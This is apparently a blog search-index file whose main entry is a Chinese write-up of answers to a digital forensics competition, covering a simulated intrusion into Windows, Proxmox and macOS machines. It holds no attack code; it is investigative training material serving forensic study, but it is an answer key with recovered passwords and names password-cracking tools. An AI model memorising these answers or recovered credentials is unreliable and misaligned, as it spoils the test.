<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0xGame-取证</title>
    <url>/2024/10/27/0xGame-%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>取证</tag>
      </tags>
  </entry>
  <entry>
    <title>美亚22团队</title>
    <url>/2024/11/07/22%E5%9B%A2%E9%98%9F/</url>
    <content><![CDATA[<h1 id="1-分析AGC-CS计算机-Computer-里最初的作業系統-Windows-，它的实際安装时间是什么-以时区UTC-8回答-3"><a href="#1-分析AGC-CS计算机-Computer-里最初的作業系統-Windows-，它的实際安装时间是什么-以时区UTC-8回答-3" class="headerlink" title="1    分析AGC-CS计算机 (Computer) 里最初的作業系統 (Windows) ，它的实際安装时间是什么? (以时区UTC+8回答)    3"></a>1    分析AGC-CS计算机 (Computer) 里最初的作業系統 (Windows) ，它的实際安装时间是什么? (以时区UTC+8回答)    3</h1><p>单选<br>A:2022-09-26 14:35:17;<br>B:2022-09-26 21:35:17;<br>C:2022-09-27 05:35:17;<br>D:2022-10-05 03:52:15;<br>E:2022-10-05 11:52:15<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-141748646.png" class=""><br>C</p>
<h1 id="2-AGC-CS计算机里的-‘Acrobat-DC’-软件的安装时间是-以时区UTC-8回答-如答案为-2022-12-29-16-01-59，需回答-20221229160159-1"><a href="#2-AGC-CS计算机里的-‘Acrobat-DC’-软件的安装时间是-以时区UTC-8回答-如答案为-2022-12-29-16-01-59，需回答-20221229160159-1" class="headerlink" title="2    AGC-CS计算机里的 ‘Acrobat DC’ 软件的安装时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159)    1"></a>2    AGC-CS计算机里的 ‘Acrobat DC’ 软件的安装时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159)    1</h1><p>单选<br>A:2022-09-28 19:01:40;<br>B:2022-09-28 07:18:33;<br>C:2022-08-30 19:01:40;<br>D:2022-08-30 07:18:33<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-142100715.png" class=""><br>A</p>
<h1 id="3-AGC-CS计算机里的用户-‘Carson’-链接了一个网络磁盘机-Network-Drive-，在下列哪一个档案有相关资料-2"><a href="#3-AGC-CS计算机里的用户-‘Carson’-链接了一个网络磁盘机-Network-Drive-，在下列哪一个档案有相关资料-2" class="headerlink" title="3    AGC-CS计算机里的用户 ‘Carson’ 链接了一个网络磁盘机 (Network Drive)，在下列哪一个档案有相关资料?    2"></a>3    AGC-CS计算机里的用户 ‘Carson’ 链接了一个网络磁盘机 (Network Drive)，在下列哪一个档案有相关资料?    2</h1><p>单选<br>A:\Users\Carson\NTUSER.DAT;<br>B:\Users\admin\NTUSER.DAT;<br>C:\Windows\System32\config\SYSTEM;<br>D:\Windows\System32\config\SOFTWARE;<br>E:\Windows\System32\config\SECURITY<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-144527700.png" class=""><br>网络磁盘是通过ip+文件夹的方式来连接的，我们从资源管理器可以找到网络磁盘。看一下源文件是什么<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-144633691.png" class="">  </p>
<p>A</p>
<h1 id="4-承上题，用户-‘Carson’-连接的网络磁盘机的IP地址是什么-1"><a href="#4-承上题，用户-‘Carson’-连接的网络磁盘机的IP地址是什么-1" class="headerlink" title="4    承上题，用户 ‘Carson’ 连接的网络磁盘机的IP地址是什么?    1"></a>4    承上题，用户 ‘Carson’ 连接的网络磁盘机的IP地址是什么?    1</h1><p>单选<br>A:\192.168.182.134\;<br>B:\192.168.182.134\photo;<br>C:\192.168.182.134\share;<br>D:\192.168.182.134\AGC;<br>E:\192.168.182.134\AGC photo</p>
<p>从上题可以看出C</p>
<h1 id="5-分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层-以阿拉伯数字回答-1-填空"><a href="#5-分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层-以阿拉伯数字回答-1-填空" class="headerlink" title="5    分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层 (以阿拉伯数字回答)    1    填空"></a>5    分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层 (以阿拉伯数字回答)    1    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-145552827.png" class="">  
<p>45楼</p>
<h1 id="6-承上题，王景浩使用的信用卡号码最后四位数字是-1-填空"><a href="#6-承上题，王景浩使用的信用卡号码最后四位数字是-1-填空" class="headerlink" title="6    承上题，王景浩使用的信用卡号码最后四位数字是?    1    填空"></a>6    承上题，王景浩使用的信用卡号码最后四位数字是?    1    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-145649007.png" class="">  
<p>6717</p>
<h1 id="7-AGC-CS计算机用户-‘Carson’-曾经收到一个电邮并通过里面的链结下载了一个可疑的-‘Word’-文件，那个档案的档案名是什么-不要输入-‘-’，以大写英文及阿拉伯数字回答。如-Cat10-jpg，需回答CAT10JPG-1-填空"><a href="#7-AGC-CS计算机用户-‘Carson’-曾经收到一个电邮并通过里面的链结下载了一个可疑的-‘Word’-文件，那个档案的档案名是什么-不要输入-‘-’，以大写英文及阿拉伯数字回答。如-Cat10-jpg，需回答CAT10JPG-1-填空" class="headerlink" title="7    AGC-CS计算机用户 ‘Carson’ 曾经收到一个电邮并通过里面的链结下载了一个可疑的 ‘Word’ 文件，那个档案的档案名是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)    1    填空"></a>7    AGC-CS计算机用户 ‘Carson’ 曾经收到一个电邮并通过里面的链结下载了一个可疑的 ‘Word’ 文件，那个档案的档案名是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)    1    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-152204528.png" class="">  
<p>KEDmuon<br>点击连接再浏览器下载，默认下载位置是再download，我们可以再download看到一个word文件</p>
<h1 id="8-承上题，分析该-‘Word’-文件，它的可能用途是-3"><a href="#8-承上题，分析该-‘Word’-文件，它的可能用途是-3" class="headerlink" title="8    承上题，分析该 ‘Word’ 文件，它的可能用途是?    3"></a>8    承上题，分析该 ‘Word’ 文件，它的可能用途是?    3</h1><p>单选<br>A:访问一个网站;<br>B:记录键盘操作;<br>C:把档案加密;<br>D:改变桌面壁纸;<br>E:关闭计算机<br>A<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-154033690.png" class="">  </p>
<h1 id="9-AGC-CS计算机里有一个名为-‘admin’-的用户，它是在何时被建立的-以时区UTC-8回答-1"><a href="#9-AGC-CS计算机里有一个名为-‘admin’-的用户，它是在何时被建立的-以时区UTC-8回答-1" class="headerlink" title="9    AGC-CS计算机里有一个名为 ‘admin’ 的用户，它是在何时被建立的? (以时区UTC+8回答)    1"></a>9    AGC-CS计算机里有一个名为 ‘admin’ 的用户，它是在何时被建立的? (以时区UTC+8回答)    1</h1><p>单选<br>A:2022-09-28;<br>B:2022-09-29;<br>C:2022-09-30;<br>D:2022-10-01;<br>E:以上皆非<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-150930637.png" class=""><br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-150952729.png" class=""><br>B</p>
<h1 id="10-黑客第一次采用用户-‘admin’-通过远程桌面协议-Remote-Desktop-Protocol-RDP-登录了AGC-CS计算机的时间是-以时区UTC-8回答-如答案为-2022-12-29-16-01-59，需回答-20221229160159-2-填空"><a href="#10-黑客第一次采用用户-‘admin’-通过远程桌面协议-Remote-Desktop-Protocol-RDP-登录了AGC-CS计算机的时间是-以时区UTC-8回答-如答案为-2022-12-29-16-01-59，需回答-20221229160159-2-填空" class="headerlink" title="10    黑客第一次采用用户 ‘admin’ 通过远程桌面协议 (Remote Desktop Protocol - RDP) 登录了AGC-CS计算机的时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159)    2    填空"></a>10    黑客第一次采用用户 ‘admin’ 通过远程桌面协议 (Remote Desktop Protocol - RDP) 登录了AGC-CS计算机的时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159)    2    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-151156225.png" class="">  
<p>我们可以看到ip都一样可以知道都是一个人连的那么这个人只能是黑客<br>20220929204102</p>
<h1 id="11-黑客入侵AGC-CS计算机后下载了一个扫描端口-Port-Scanning-的软件，这软件的真正名称是-以大写英文及阿拉伯数字回答-3-填空"><a href="#11-黑客入侵AGC-CS计算机后下载了一个扫描端口-Port-Scanning-的软件，这软件的真正名称是-以大写英文及阿拉伯数字回答-3-填空" class="headerlink" title="11    黑客入侵AGC-CS计算机后下载了一个扫描端口 (Port Scanning) 的软件，这软件的真正名称是? (以大写英文及阿拉伯数字回答)    3    填空"></a>11    黑客入侵AGC-CS计算机后下载了一个扫描端口 (Port Scanning) 的软件，这软件的真正名称是? (以大写英文及阿拉伯数字回答)    3    填空</h1><p>可以再download看到svchost<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-152529418.png" class=""><br>运行vcshost可以发现器是端口扫描器</p>
<h1 id="12-承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址-‘Media-Access-Control’-Address-MAC-Address-并存到一个名为-‘ip-txt’-的档案。-当中-‘192-168-182-130’-计算机的MAC地址是什么-不要输入-‘：’-或-‘-‘-，以大写英文及阿拉伯数字回答-3-填空"><a href="#12-承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址-‘Media-Access-Control’-Address-MAC-Address-并存到一个名为-‘ip-txt’-的档案。-当中-‘192-168-182-130’-计算机的MAC地址是什么-不要输入-‘：’-或-‘-‘-，以大写英文及阿拉伯数字回答-3-填空" class="headerlink" title="12    承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址 (‘Media Access Control’ Address - MAC Address) 并存到一个名为 ‘ip.txt’ 的档案。 当中 ‘192.168.182.130’ 计算机的MAC地址是什么? (不要输入 ‘：’ 或 ‘-‘ ，以大写英文及阿拉伯数字回答)    3    填空"></a>12    承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址 (‘Media Access Control’ Address - MAC Address) 并存到一个名为 ‘ip.txt’ 的档案。 当中 ‘192.168.182.130’ 计算机的MAC地址是什么? (不要输入 ‘：’ 或 ‘-‘ ，以大写英文及阿拉伯数字回答)    3    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-155737605.png" class="">  
<p>找ip.txt显示再桌面但是仿真起来，桌面找不到，看一下远控软件ip.txt传回了jinhao的电脑</p>
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-161036383.png" class="">  
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-161003081.png" class="">  
<p>9061aec09045</p>
<h1 id="13-AGC-CS计算机里的一个跳转列表-Jumplist-显示了用户-‘admin’-曾经采用记事本-Notepad-打开了一个文字档案，这个文字档的SHA-256哈希值是什么-以大写英文及阿拉伯数字回答-3-填空"><a href="#13-AGC-CS计算机里的一个跳转列表-Jumplist-显示了用户-‘admin’-曾经采用记事本-Notepad-打开了一个文字档案，这个文字档的SHA-256哈希值是什么-以大写英文及阿拉伯数字回答-3-填空" class="headerlink" title="13    AGC-CS计算机里的一个跳转列表 (Jumplist) 显示了用户 ‘admin’ 曾经采用记事本 (Notepad) 打开了一个文字档案，这个文字档的SHA-256哈希值是什么?  (以大写英文及阿拉伯数字回答)    3    填空"></a>13    AGC-CS计算机里的一个跳转列表 (Jumplist) 显示了用户 ‘admin’ 曾经采用记事本 (Notepad) 打开了一个文字档案，这个文字档的SHA-256哈希值是什么?  (以大写英文及阿拉伯数字回答)    3    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-161339346.png" class="">  
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-155143078.png" class="">  
<p>320A98F6519748D16B8870EF4D8A606D656C5A09CF2F660AA35EBF6495824CB1</p>
<h1 id="14-黑客除了通过-‘RDP’-外，还采用什么软件远端控制-Remote-Control-AGC-CS计算机-1"><a href="#14-黑客除了通过-‘RDP’-外，还采用什么软件远端控制-Remote-Control-AGC-CS计算机-1" class="headerlink" title="14    黑客除了通过 ‘RDP’ 外，还采用什么软件远端控制 (Remote Control) AGC-CS计算机?    1"></a>14    黑客除了通过 ‘RDP’ 外，还采用什么软件远端控制 (Remote Control) AGC-CS计算机?    1</h1><p>单选<br>A:VNC;<br>B:Teamviewer;<br>C:Anydesk;<br>D:Splashtop Business Access;<br>E:RemotePC<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-160149628.png" class="">  </p>
<p>B</p>
<h1 id="15-AGC-Server里LVM-Logical-Volume-Management-逻辑卷轴管理-的-VG-Volume-Group-卷组-‘pve’-共有多少PE-Physical-Extent-物理块-以阿拉伯数字回答-1-填空"><a href="#15-AGC-Server里LVM-Logical-Volume-Management-逻辑卷轴管理-的-VG-Volume-Group-卷组-‘pve’-共有多少PE-Physical-Extent-物理块-以阿拉伯数字回答-1-填空" class="headerlink" title="15    AGC_Server里LVM (Logical Volume Management 逻辑卷轴管理) 的 VG (Volume Group 卷组) ‘pve’ 共有多少PE (Physical Extent 物理块) ? (以阿拉伯数字回答)    1    填空"></a>15    AGC_Server里LVM (Logical Volume Management 逻辑卷轴管理) 的 VG (Volume Group 卷组) ‘pve’ 共有多少PE (Physical Extent 物理块) ? (以阿拉伯数字回答)    1    填空</h1><h1 id="16-AGC-Server里LVM-的-LV-邏輯卷-”pve-data”-使用了多少百分比的空間-不用填寫-‘-’，以阿拉伯数字回答-3-填空"><a href="#16-AGC-Server里LVM-的-LV-邏輯卷-”pve-data”-使用了多少百分比的空間-不用填寫-‘-’，以阿拉伯数字回答-3-填空" class="headerlink" title="16    AGC_Server里LVM 的 LV(邏輯卷)”pve-data” 使用了多少百分比的空間? (不用填寫 ‘%’，以阿拉伯数字回答)    3    填空"></a>16    AGC_Server里LVM 的 LV(邏輯卷)”pve-data” 使用了多少百分比的空間? (不用填寫 ‘%’，以阿拉伯数字回答)    3    填空</h1><h1 id="17-AGC-Server里的-‘Proxmox’-虚拟化环境-Virtual-Environment-VE-有哪一个用户-2"><a href="#17-AGC-Server里的-‘Proxmox’-虚拟化环境-Virtual-Environment-VE-有哪一个用户-2" class="headerlink" title="17    AGC_Server里的 ‘Proxmox’ 虚拟化环境 (Virtual Environment - VE) 有哪一个用户?    2"></a>17    AGC_Server里的 ‘Proxmox’ 虚拟化环境 (Virtual Environment - VE) 有哪一个用户?    2</h1><p>多选    A:root;<br>B:VM_admin;<br>C:sysadmin;<br>D:acl;<br>E:tss    </p>
<h1 id="18-分析-‘VM’-虚拟机-编号-‘111’-AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行-Remote-Code-Execution-的网络攻击？-以阿拉伯数字回答-2-填空"><a href="#18-分析-‘VM’-虚拟机-编号-‘111’-AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行-Remote-Code-Execution-的网络攻击？-以阿拉伯数字回答-2-填空" class="headerlink" title="18    分析 ‘VM’ (虚拟机) 编号 ‘111’ AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行 (Remote Code Execution) 的网络攻击？ (以阿拉伯数字回答)    2    填空"></a>18    分析 ‘VM’ (虚拟机) 编号 ‘111’ AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行 (Remote Code Execution) 的网络攻击？ (以阿拉伯数字回答)    2    填空</h1><h1 id="19-哪一个IP地址尝试登录’VM’-虚拟机-编号-‘111’-失败次数最多-1"><a href="#19-哪一个IP地址尝试登录’VM’-虚拟机-编号-‘111’-失败次数最多-1" class="headerlink" title="19    哪一个IP地址尝试登录’VM’ (虚拟机) 编号 ‘111’ 失败次数最多?    1"></a>19    哪一个IP地址尝试登录’VM’ (虚拟机) 编号 ‘111’ 失败次数最多?    1</h1><p>单选<br>A:38.242.130.207;<br>B:218.92.0.206;<br>C:43.142.93.22;<br>D:121.202.141.105;<br>E:61.238.217.108    </p>
<h1 id="20-黑客在入侵-‘VM’-编号-‘111’-后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口-Port-是什么-以阿拉伯数字回答-3-填空"><a href="#20-黑客在入侵-‘VM’-编号-‘111’-后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口-Port-是什么-以阿拉伯数字回答-3-填空" class="headerlink" title="20    黑客在入侵 ‘VM’ 编号 ‘111’ 后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口 (Port) 是什么? (以阿拉伯数字回答)    3    填空"></a>20    黑客在入侵 ‘VM’ 编号 ‘111’ 后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口 (Port) 是什么? (以阿拉伯数字回答)    3    填空</h1><h1 id="21-根据-‘VM’-编号-‘111’-里的网页服务器-Web-Server-的设定，访客可从下列哪个网页地址访问这个服务器-2"><a href="#21-根据-‘VM’-编号-‘111’-里的网页服务器-Web-Server-的设定，访客可从下列哪个网页地址访问这个服务器-2" class="headerlink" title="21    根据 ‘VM’ 编号 ‘111’ 里的网页服务器 (Web Server) 的设定，访客可从下列哪个网页地址访问这个服务器?    2"></a>21    根据 ‘VM’ 编号 ‘111’ 里的网页服务器 (Web Server) 的设定，访客可从下列哪个网页地址访问这个服务器?    2</h1><p>多选    A:localhost;<br>B:www.ag.com.shop;<br>C:www.agcom.shop;<br>D:agcom.shop;<br>E:www.agcom.com    </p>
<h1 id="22-黑客曾入侵-‘VM’-编号-‘111’-里的电邮系统-‘Xeams’，他登录的时间是-以unix时间戳回答，格式如-1665049779010-2-填空"><a href="#22-黑客曾入侵-‘VM’-编号-‘111’-里的电邮系统-‘Xeams’，他登录的时间是-以unix时间戳回答，格式如-1665049779010-2-填空" class="headerlink" title="22    黑客曾入侵 ‘VM’ 编号 ‘111’ 里的电邮系统 ‘Xeams’，他登录的时间是? (以unix时间戳回答，格式如:1665049779010)    2    填空"></a>22    黑客曾入侵 ‘VM’ 编号 ‘111’ 里的电邮系统 ‘Xeams’，他登录的时间是? (以unix时间戳回答，格式如:1665049779010)    2    填空</h1><h1 id="23-黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统-Operating-System-及电邮软件-Mail-Agent-是什么-2"><a href="#23-黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统-Operating-System-及电邮软件-Mail-Agent-是什么-2" class="headerlink" title="23    黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统 (Operating System) 及电邮软件 (Mail Agent) 是什么?    2"></a>23    黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统 (Operating System) 及电邮软件 (Mail Agent) 是什么?    2</h1><p>单选<br>A:Mac OS X 10.15 rv:102.0 Thunderbird/102.3.0;<br>B:Mac OS X 10.15 rv:102.0 Thunderbird/91.13.1;<br>C:Mac OS X 10.11 rv:91.0 Thunderbird/91.13.1;<br>D:Mac OS X 10.11 rv:60.0 Thunderbird/60.9.1;<br>E:Windows 10 Pro Outlook 2016    </p>
<h1 id="24-黑客在-‘Proxmox’-里留下了一个被加密了的程序-Program-，在解密后它的SHA-256哈希值-Hash-Value-是什么-2"><a href="#24-黑客在-‘Proxmox’-里留下了一个被加密了的程序-Program-，在解密后它的SHA-256哈希值-Hash-Value-是什么-2" class="headerlink" title="24    黑客在 ‘Proxmox’ 里留下了一个被加密了的程序 (Program)，在解密后它的SHA-256哈希值 (Hash Value) 是什么?    2"></a>24    黑客在 ‘Proxmox’ 里留下了一个被加密了的程序 (Program)，在解密后它的SHA-256哈希值 (Hash Value) 是什么?    2</h1><p>单选<br>A:C89D7A… …8C4E76;<br>B:C7141F… …64BF65;<br>C:E9433E… …1A5134;<br>D:45CE1C… …79BD4A;<br>E:0ACAA5… …AB7ECE    </p>
<h1 id="25-承上题，分析程序代码-Program-Code-，上述程序的档案名应该是什么-不要输入-‘-’，以大写英文及阿拉伯数字回答。如-Cat10-jpg，需回答CAT10JPG-3-填空"><a href="#25-承上题，分析程序代码-Program-Code-，上述程序的档案名应该是什么-不要输入-‘-’，以大写英文及阿拉伯数字回答。如-Cat10-jpg，需回答CAT10JPG-3-填空" class="headerlink" title="25    承上题，分析程序代码 (Program Code)，上述程序的档案名应该是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)    3    填空"></a>25    承上题，分析程序代码 (Program Code)，上述程序的档案名应该是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)    3    填空</h1><h1 id="26-于虚拟机-‘VM’-编号-‘111’-里的档案-‘-srv-samba-share-AGC-photo-DSC01139-JPG’-，照片中出现的街道名称是-2"><a href="#26-于虚拟机-‘VM’-编号-‘111’-里的档案-‘-srv-samba-share-AGC-photo-DSC01139-JPG’-，照片中出现的街道名称是-2" class="headerlink" title="26    于虚拟机 ‘VM’ 编号 ‘111’ 里的档案 ‘\srv\samba\share\AGC photo\DSC01139.JPG’ ，照片中出现的街道名称是?    2"></a>26    于虚拟机 ‘VM’ 编号 ‘111’ 里的档案 ‘\srv\samba\share\AGC photo\DSC01139.JPG’ ，照片中出现的街道名称是?    2</h1><p>单选<br>A:河背街;<br>B:沙咀道;<br>C:众安街;<br>D:香车街;<br>E:川龙街    </p>
<h1 id="27-王景浩的计算机使用什么文件系统-File-System-1"><a href="#27-王景浩的计算机使用什么文件系统-File-System-1" class="headerlink" title="27    王景浩的计算机使用什么文件系统 (File System) ?    1"></a>27    王景浩的计算机使用什么文件系统 (File System) ?    1</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-162613912.png" class="">  
<p>单选<br>A:exFAT;<br>B:APFS;<br>C:HFS;<br>D:HFS+<br>D</p>
<h1 id="28-王景浩计算机的操作系统-Operating-System-版本是什么-1"><a href="#28-王景浩计算机的操作系统-Operating-System-版本是什么-1" class="headerlink" title="28    王景浩计算机的操作系统 (Operating System) 版本是什么?    1"></a>28    王景浩计算机的操作系统 (Operating System) 版本是什么?    1</h1><p>单选<br>A:10.4.11;<br>B:10.9.5;<br>C:10.10.5;<br>D:10.11.6<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-162217902.png" class=""><br>D</p>
<h1 id="29-王景浩的计算机当前有多少个用户-包括访客-‘Guest’-以阿拉伯数字回答-1-填空"><a href="#29-王景浩的计算机当前有多少个用户-包括访客-‘Guest’-以阿拉伯数字回答-1-填空" class="headerlink" title="29    王景浩的计算机当前有多少个用户 (包括访客 ‘Guest’ )? (以阿拉伯数字回答)    1    填空"></a>29    王景浩的计算机当前有多少个用户 (包括访客 ‘Guest’ )? (以阿拉伯数字回答)    1    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-162806579.png" class="">  
<p>6个且用户不包括下面的_www等</p>
<h1 id="30-王景浩的计算机里有一个用户被删除，被删除的用户名称是什么-以大写英文回答-1-填空"><a href="#30-王景浩的计算机里有一个用户被删除，被删除的用户名称是什么-以大写英文回答-1-填空" class="headerlink" title="30    王景浩的计算机里有一个用户被删除，被删除的用户名称是什么? (以大写英文回答)    1    填空"></a>30    王景浩的计算机里有一个用户被删除，被删除的用户名称是什么? (以大写英文回答)    1    填空</h1><p>BROTHER</p>
<h1 id="31-王景浩的计算机有多少个-‘聚焦’-的搜索记録-Spotlight-Search-以阿拉伯数字回答-1-填空"><a href="#31-王景浩的计算机有多少个-‘聚焦’-的搜索记録-Spotlight-Search-以阿拉伯数字回答-1-填空" class="headerlink" title="31    王景浩的计算机有多少个 ‘聚焦’ 的搜索记録 (Spotlight Search) ? (以阿拉伯数字回答)    1    填空"></a>31    王景浩的计算机有多少个 ‘聚焦’ 的搜索记録 (Spotlight Search) ? (以阿拉伯数字回答)    1    填空</h1><h1 id="32-当用户设置了自动登录-Auto-Login-后，王景浩计算机的操作系统会产生哪个档案-2"><a href="#32-当用户设置了自动登录-Auto-Login-后，王景浩计算机的操作系统会产生哪个档案-2" class="headerlink" title="32    当用户设置了自动登录 (Auto Login) 后，王景浩计算机的操作系统会产生哪个档案?    2"></a>32    当用户设置了自动登录 (Auto Login) 后，王景浩计算机的操作系统会产生哪个档案?    2</h1><p>单选</p>
<p>A:manifest.plist;<br>B:info.plist;<br>C:PasswordPanel.strings;<br>D:kcpassword<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-163911712.png" class="">  </p>
<p>D</p>
<h1 id="33-王景浩计算机的登录密码-Login-Password-是什么-2"><a href="#33-王景浩计算机的登录密码-Login-Password-是什么-2" class="headerlink" title="33    王景浩计算机的登录密码 (Login Password) 是什么?    2"></a>33    王景浩计算机的登录密码 (Login Password) 是什么?    2</h1><p>单选<br>A:1qa@WS3ed;<br>B:3ed$RF5tg;<br>C:5tg^YH7uj;<br>D:2ws$RF6yh    </p>
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-164755863.png" class="">  
<p>x-ways直接解析出了密码<br>D</p>
<h1 id="34-在王景浩的计算机里，他最后使用哪个电邮地址登录-‘iCloud’-账号-2"><a href="#34-在王景浩的计算机里，他最后使用哪个电邮地址登录-‘iCloud’-账号-2" class="headerlink" title="34    在王景浩的计算机里，他最后使用哪个电邮地址登录 ‘iCloud’ 账号?    2"></a>34    在王景浩的计算机里，他最后使用哪个电邮地址登录 ‘iCloud’ 账号?    2</h1><p>单选<br>A:kinghoo0w0@gmail.com;<br>B:wonghoo588@yahoo.com;<br>C:kingho726@aol.com;<br>D:kinghoo0w0@yahoo.com<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-165238613.png" class="">  </p>
<h1 id="35-王景浩计算机里的手机备份-iTunes-Backup-包含哪些iOS版本-2"><a href="#35-王景浩计算机里的手机备份-iTunes-Backup-包含哪些iOS版本-2" class="headerlink" title="35    王景浩计算机里的手机备份 (iTunes Backup) 包含哪些iOS版本?    2"></a>35    王景浩计算机里的手机备份 (iTunes Backup) 包含哪些iOS版本?    2</h1><p>多选<br>A:12.5.6;<br>B:15.4;<br>C:15.5;<br>D:16.0.3<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-174909909.png" class="">  </p>
<p>AC</p>
<h1 id="36-王景浩曾经将一台-iPhone-6-连接他的计算机，请问它最后的连接时间是什么-以时区UTC-8回答-如答案为-2022-12-29-16-01-59，需回答-20221229160159-2-填空"><a href="#36-王景浩曾经将一台-iPhone-6-连接他的计算机，请问它最后的连接时间是什么-以时区UTC-8回答-如答案为-2022-12-29-16-01-59，需回答-20221229160159-2-填空" class="headerlink" title="36    王景浩曾经将一台 iPhone 6 连接他的计算机，请问它最后的连接时间是什么? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159)    2    填空"></a>36    王景浩曾经将一台 iPhone 6 连接他的计算机，请问它最后的连接时间是什么? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159)    2    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-175045431.png" class="">  
<p>我们可以再蓝牙连接里找到iPhone但是看备份可知这时XR。再未匹配里可以找到另一个<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-175158687.png" class="">  </p>
<h1 id="37-苹果手机备份的密码-iTunes-Backup-Encryption-Password-会记录在什么档案-2"><a href="#37-苹果手机备份的密码-iTunes-Backup-Encryption-Password-会记录在什么档案-2" class="headerlink" title="37    苹果手机备份的密码 (iTunes Backup Encryption Password) 会记录在什么档案?    2"></a>37    苹果手机备份的密码 (iTunes Backup Encryption Password) 会记录在什么档案?    2</h1><p>单选<br>A:Info.plist;<br>B:privacy.json;<br>C:Manifest.plist;<br>D:PasswordPanel.strings    </p>
<p>C</p>
<h1 id="38-以下哪种工具可以用作破解密码-1"><a href="#38-以下哪种工具可以用作破解密码-1" class="headerlink" title="38    以下哪种工具可以用作破解密码?    1"></a>38    以下哪种工具可以用作破解密码?    1</h1><p>多选<br>A:Passware;<br>B:John The Ripper;<br>C:HashCat;<br>D:Password Recovery Toolkit<br>ABCD</p>
